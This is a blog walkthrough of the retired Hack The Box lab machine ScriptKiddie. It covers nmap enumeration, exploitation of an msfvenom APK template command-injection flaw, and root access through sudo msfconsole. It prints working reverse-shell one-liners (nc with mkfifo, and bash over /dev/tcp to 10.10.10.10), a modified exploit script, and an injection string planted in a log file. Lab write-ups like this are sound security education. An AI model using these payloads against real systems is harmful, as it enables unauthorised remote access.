---
layout: single
title: "Hackthebox write-up: ScriptKiddie"
namespace: htb-scriptkiddie
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-06-05 16:00:00
header:
   teaser: https://i.imgur.com/wHnMfBz.png
---

Hello guys!

This week's machine will be **ScriptKiddie**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu), created by [0xdf](https://app.hackthebox.eu/users/4935).<!--more-->

:information_source: **Info**:  Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![ScriptKiddie](https://i.imgur.com/W5wv9JE.png){: .align-center}

## Enumeration

As usual, started running a `nmap` quick scan, to see which services were published in this machine.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.226                                                                   

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 14:05 -03
Nmap scan report for 10.10.10.226
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
```

### 5000/TCP - HTTP Service

Once accessed the published page, noticed some hacking tools published making easier to a script kiddie to play with hacking, allowing you to scan an IP using `nmap`, create a `msfvenom` payload or search for exploits using `searchsploit`.

I've tried several ways to inject command in these forms, but none of the attempts succeeded. I have even found an interesting tool called [commixproject/commix](https://github.com/commixproject/commix) in GitHub that automates this process, but had no luck this time.

Looking for vulnerabilities in the tools used by the app (`nmap`, `msfvenom`, `searchsploit`), I have found one related to `msfvenom`, as below:

```bash
$ searchsploit msfvenom
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection | multiple/local/49491.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Initial access and User flag

After changing the python script available in searchsploit, using the desired payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`, I have found some errors during the execution of the binary `keytool`, once it tries to sign an APK file with the payload in the Common Name but, as there was a `+` in the base64 encoded content, made a quick change to encode it twice, allowing me to create an evil APK to be uploaded to the tool and exploit the vulnerability

```python
# Change me
payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
if '+' in payload_b64:
    payload_b64 = b64encode(payload_b64.encode()).decode()
    decode = '| base64 -d | base64 -d'
else:
    decode = '| base64 -d'

dname = f"CN='|echo -n {payload_b64} {decode} | sh #"
```

Below we can see the output of the execution which generates the `evil.apk` file.

```bash
$ python3 49491.py                                                                                                               
[+] Manufacturing evil apkfile
Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
-dname: CN='|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk
Do: msfvenom -x /tmp/tmpt7qr4ner/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

After obtaining the evil payload, started one listener and selected the options suggested in the payload output, where selecting the android operating system would result in the payload `android/meterpreter/reverse_tcp` we aim to abuse based in the existing vulnerability, as well as specifying the lhost as 127.0.0.1 but this shouldn't impact the way exploit will work.

![Submiting the evil payload](https://i.imgur.com/hWgxfFw.png){: .align-center}

After hitting the **Generate** button, a reverse shell was returned, as seen below in this screenshot.

![reverse shell returned](https://i.imgur.com/VAYnB2r.png){: .align-center}

Inspecting the session obtained, with the credentials running the web application, in this case user `kid`, was possible to obtain the user flag, as the file resided in it's home directory.

```bash
kid@scriptkiddie:~$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
kid@scriptkiddie:~$ cat /home/kid/user.txt
<redacted>
```

## Root flag

After running `linenum.sh` to automate the enumeration, noticed taht there was another user called `pwn`, possibly with more privileges than the user we currently have. As we had access to it's home directory, found a file called `scanloosers.sh` with the following content:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

As this script reads the content of a file in the current's user home directory (`/home/kid/logs/hackers`) and issues an `nmap` command, edited the content of this file in a way we would inject a reverse shell command with the user running this script, possibly `pwn`.

```bash
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' #" > ~/logs/hackers
```

After setting up a new listener and changing the `hackers` file with the above-mentioned content, another session was obtained, this time with the user `pwn` :smile:

Enumerating the box again, this time with the new user account, noticed by running `linpeas.sh` that this user has access to start `msfconsole` in a privileged way.

```output
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Once started it using `sudo`, I was able to issue commands as user `root`, as well as read the content of file `/root/root.txt` and obtain the final flag for this machine.

```bash
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q
msf6 > id
[*] exec: id

uid=0(root) gid=0(root) groups=0(root)
msf6 > cat /root/root.txt
[*] exec: cat /root/root.txt

<redacted>
msf6 >
```

Hope this was somehow useful!

See you in the next post :smiley:
